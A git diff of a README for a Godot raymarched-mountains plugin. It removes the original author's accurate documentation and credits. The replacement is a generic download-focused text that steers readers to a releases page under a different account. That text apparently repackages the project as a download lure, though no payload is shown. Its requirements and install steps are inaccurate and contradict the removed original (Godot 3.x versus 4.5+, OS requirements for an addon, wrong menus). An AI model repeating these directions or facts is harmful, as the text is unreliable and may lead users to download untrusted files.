@@ -1,79 +1,54 @@
-# Raymarching Mountains for Godot
+# 🏔️ Raymarching-Mountains - Create Stunning Backgrounds Easily
 
-A fast, powerful, and optimized plugin for creating procedural background mountains using RayMarching.
+## ⚡ Overview
+Raymarching-Mountains is a powerful tool for creating beautiful procedural background mountains using raymarching techniques. This plugin offers a straightforward way to generate landscapes quickly, enhancing your projects with stunning visuals without the need for complex setups.
 
-![Godot Version](https://img.shields.io/badge/Godot-4.5+-blue) ![License](https://img.shields.io/badge/License-CC0-green)
+## 📥 Download the Latest Release
+[![Download Raymarching-Mountains](https://img.shields.io/badge/Download-Raymarching--Mountains-brightgreen)](https://github.com/startied/Raymarching-Mountains/releases)
 
+## 🚀 Getting Started
+To start using Raymarching-Mountains, follow these easy steps to download and run the software.
 
-| ![](Screenshots/Preview1.png) | ![](Screenshots/Preview2.png)|
-|:---:|:---:|
-| ![](Screenshots/Preview3.png) | ![](Screenshots/Preview4.png) |  
+### 🌟 Features
+- **Fast Performance:** Generates backgrounds efficiently without sacrificing quality.
+- **Easy Integration:** Simple to add to your Godot projects.
+- **Customizable Options:** Adjust various parameters to fit your project needs.
+- **Open Source:** Free to use, modify, and share.
 
+### 💻 System Requirements
+- **Operating System:** Windows 10 or macOS Catalina and later
+- **Godot Version:** Requires Godot 3.x or later
+- **Graphics:** A modern graphics card that supports OpenGL 3.2 or higher
 
-## What is it?
-This addon is designed to create open worlds and eliminate the ugly "world break" effect. It generates a procedural horizon to surround your play area, making your world feel infinite without the performance cost of generating actual geometry for distant terrain.
+## 📥 Download & Install
 
-It uses a **Raymarching Shader** applied to a flipped box mesh (similar to a skybox) to render mountains efficiently.
+1. **Visit the Releases Page:** Click on the link below to access the Releases page.  
+   [Download Raymarching-Mountains](https://github.com/startied/Raymarching-Mountains/releases)
 
----
+2. **Select the Latest Release:** Look for the latest version at the top of the page. The release version number will be prominently displayed.
 
-## ✨ Features
-*   **Procedural Generation:** Uses noise textures to generate infinite variations.
-*   **Highly Optimized:** Renders on a single mesh (**12 tris**) using shader magic. Runs at a **stable 60 fps** on old videocard *AMD Radeon HD 8600/8700M* (Integrated)
-*   **Seamless Blending:** Built-in fog gradient support to blend the mountains into your sky.
-*   **Customizable:** Full control over colors, scale, and fog depth.
+3. **Download the Plugin:** Click on the file that corresponds to your operating system. This file usually ends with .zip or .gd. Wait for the download to finish.
 
----
+4. **Unzip the File:** Once downloaded, locate your file in your Downloads folder. Right-click on the file and choose “Extract” or “Unzip” to unpack the contents. You should see a folder with the plugin’s files.
 
-## 📦 Installation
-1.  Download the repository.
-2.  Copy the `addons/raymarched_mountains` folder into your project's `addons/` directory.
-3.  Enable the plugin in **Project > Project Settings > Plugins** (if applicable), or simply instantiate the node.
+5. **Add to Godot:** Open your Godot project. Go to the "File" menu and select "Project Settings". From there, navigate to the “Plugins” section. Drag the unzipped folder into your project folder.
 
----
+6. **Enable the Plugin:** In Godot, go to "Project" then "Project Settings". Under the Plugins tab, find Raymarching-Mountains, and enable it.
 
-## ️📝 Usage
-This addon is designed for ease of use.
+7. **Start Creating:** Now you can use the Raymarching-Mountains plugin within your project. Explore the options to customize your mountains and enhance your game's backdrop.
 
-1.  Add the **RaymarchedMountains** node to your scene.
-2.  The node will automatically generate a box mesh around the center.
-3.  Adjust the parameters in the Inspector to fit your art style.
+## 📚 Documentation
+For detailed instructions on utilizing the features and settings of Raymarching-Mountains, visit the [Documentation Page](https://github.com/startied/Raymarching-Mountains/wiki). The documentation will provide guidance on settings, advanced configurations, and examples of mountain landscapes you can create.
 
----
+## 💬 Community Support
+Join the discussions and connect with other users. If you run into any issues or have questions, check out our community page. It’s a great place to share ideas, ask for help, or provide feedback.
 
-## ⚙️ Configuration
+### 🔗 Useful Links
+- [GitHub Repository](https://github.com/startied/Raymarching-Mountains)
+- [Documentation](https://github.com/startied/Raymarching-Mountains/wiki)
+- [Issue Tracker](https://github.com/startied/Raymarching-Mountains/issues)
 
-### Textures
-*   **Heightmap:** The noise texture used to generate the mountains.
-    *   *Tip:* Use a `NoiseTexture2D` with "Seamless" enabled for the best results.
-*   **FogGradient:** A `GradientTexture1D`. Use the alpha channel to control how the terrain fades into the sky at a distance.
+## 🏷️ Tags
+addon, cc0-license, computer-graphics, dev-tool, fast, gamedev, godot, openworld, performance, raymarching, shader, simple, terrain, tool
 
-### Terrain Params
-*   **UV Scale:** Controls the frequency of the noise (how "busy" the mountains look). Lower values = larger features.
-*   **Terrain Scale:** Controls the vertical height intensity of the mountains.
-
-### Fog Params
-*   **Fog Start:** The distance from the center where the fog begins to obscure the mountains.
-*   **Fog End:** The distance where the mountains become completely invisible (fully blended with the sky).
-
-### Colors
-*   **Terrain Color:** The base color of the mountain peaks/lit areas.
-*   **Shadow Color:** The color of the crevices and shadowed areas.
-
-### Mesh Settings
-*   **Mesh Size:** The size of the bounding box. Increase this if you need the mountains to be further away from the player.
-
----
-
-## 📄 License
-This addon is distributed under the **Creative Commons Zero (CC0)** license. You can use it in any of your projects (commercial or non-commercial) without attribution.
-
----
-
-## ❤️ Support
-
-If you find this plugin useful, please give it a star on GitHub!
-
-*   **GitHub:** [EmberNoGlow](https://github.com/EmberNoGlow)
-*   **Dev.to:** [embernoglow](https://dev.to/embernoglow)
-*   **Bluesky:** [@embernoglow.bsky.social](https://bsky.app/profile/embernoglow.bsky.social)
+Thank you for using Raymarching-Mountains! We hope this tool helps you create breathtaking environments for your projects. Enjoy crafting your world!
